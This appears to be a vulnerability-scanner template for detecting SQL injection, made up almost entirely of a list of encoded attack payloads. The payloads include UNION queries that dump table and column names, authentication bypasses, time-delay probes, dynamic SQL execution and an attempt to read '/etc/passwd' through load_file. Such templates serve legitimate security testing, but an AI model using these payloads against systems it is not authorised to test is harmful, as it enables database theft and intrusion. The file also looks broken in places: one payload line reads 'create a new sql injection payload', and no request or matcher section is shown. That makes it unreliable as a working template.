
id: sqli-error-based

info:
  name: Error based SQL Injection
  author: geeknik,pdteam
  severity: critical
  description: |
    Direct SQL Command Injection is a technique where an attacker creates or alters existing SQL commands to expose hidden data,
    or to override valuable ones, or even to execute dangerous system level commands on the database host.
    This is accomplished by the application taking user input and combining it with static parameters to build an SQL query .
  metadata:
    max-request: 3
  tags: sqli,error,dast

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method != "OPTIONS"'

    payloads:
      injection:
        - "1%2529 select 1%252C2%252C3 from %2528select 1 union select name from users%2529x--"
        - "' UNION SELECT NULL%25252CNULL%252523"
        - "'1 AND SUBSTRING%2528%2528SELECT table_name FROM information_schema.tables WHERE table_schema %253D 'users' LIMIT 0%252C1%2529%252C2%252C4%2529 LIKE '%2525SQL%2525'-- -"
        - "\"1\" UNION SELECT %252A FROM %2528SELECT 1 UNION SELECT 0%252C %2528SELECT table_name FROM information_schema.tables LIMIT 4 OFFSET 15%2529%2529 -- -"
        - "' or '1'%253D'1\"--"
        - "or 1%253D1--"
        - "OR 'X'%253D'X"
        - "1 AND SUBSTRING%2528%2528SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME %253D 0x41707461%2529 - 9%252C1%252C1%2529%253Da'"
        - "or sleep%25285%2529%2523"
        - "1 AND 0x6e61637465720000"
        - "\"1%2529 or pg_sleep%25285%2529-- -"
        - "OR 1%253D1"
        - "\"X' UNION ALL SELECT concat%25280x2f%252C %2528SELECT table_name FROM information_schema.tables LIMIT 4 OFFSET 13%2529%2529-- -"
        - "\"or benchmark%252810000000%252CMD5%25281%2529%2529%2523\""
        - "1%2529"
        - "'UNION SELECT NULL%252C'x'%252CNULL%252CNULL--"
        - "1' OR 2%253D0 UNION ALL SELECT 'a'%252C'b'%252Cgroup_concat%2528table_name%2529 FROM information_schema.tables-- -"
        - "waitfor delay '0%253A0%253A30'--"
        - "1%2529%2529 or sleep%25285%2529%253D'"
        - "1' AND %2528SELECT %252A FROM %2528SELECT%2528SLEEP%25285%2529%2529%2529x%2529--"
        - "' OR 1%253D1%2523"
        - "waitfor delay '0%253A0%253A5'--"
        - "-2 union select 1%252Cconcat%25280x3a%252C%2528select concat%2528%2540%2540version%252C'%253A'%252Cdatabase%2528%2529%252C'%253A'%252Cuser%2528%2529%2529%2529%2529%252C1%252C2%252C3%252C4%252C5%252C6%252C7--"
        - "x' or SLEEP%25285%2529-- -"
        - "ORDER BY 13%2523"
        - "' OR 1%253D1-- -"
        - "-1 AND 0 BETWEEN %2528SELECT %252A FROM %2528SELECT SLEEP%25285%2529%2529%2529yHx--"
        - "'x'"
        - "1 AND 2%253D3%2523"
        - "or 1%253D1%2523"
        - "1' OR 1%253D1%2523"
        - "select 1%252C 'admin'%252C %2528SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0%2529%252C NULL%252C 1%2529 -- %250Awhere username %253D 'admin' and password like '%2525''%2525'--"
        - "' ORDER BY 20--"
        - "or 1%253Dload_file%2528'%252Fetc%252Fpasswd'%2529%252F%252A"
        - "or benchmark%252810000000%252CMD5%25281%2529%2529%2523"
        - "ORDER BY 14"
        - "or sleep%25285%2529%2523"
        - "1%2529 or benchmark%252810000000%252CMD5%25281%2529%2529%2523"
        - "if%2528SLEEP%25285%2529%2529waitfor delay '0%253A0%253A5'--"
        - "admin' AND 1%253DCAST%2528%2528SELECT table_name FROM information_schema.tables WHERE table_type LIKE 'base table'%2529 AS INT%2529--"
        - "' or '1'%253D'1'--"
        - "1'%2529%252520waitfor%252520delay%252520'0%253A0%253A20'%252520--%2526version%253DSQLInjection"
        - "-1%2529 union select 0x7465616c617920616461637420706c654e756d703f%252Ctable_name%252C0x66657200746973704d657373616765%253F"
        - "create%252520function%252520func1%2528%2529%25250Abegin%25250Aselect%252Afromusers%253Bend%253B"
        - "declare %2540q nvarchar%2528200%2529%250Aset %2540q %253D 'someSQL'%250Aexec sp_executesql %2540q"
        - "create a new sql injection payload"
        - "if%2528%2528SELECT %252A FROM %2528SELECT%2528SLEEP%25285%2529%2529%2529VJ%2529%252CNULL%252CNULL%2529%2523"
        - "SELECT %252A FROM users WHERE id %253D 2%252520OR%2525201%253D1--"
        - "1 AND %2528SELECT %252A FROM %2528SELECT%2528SLEEP%25285%2529%2529%2529zqNw%2529 AND 'gZrH'%253D'gZrH"
        - "--"


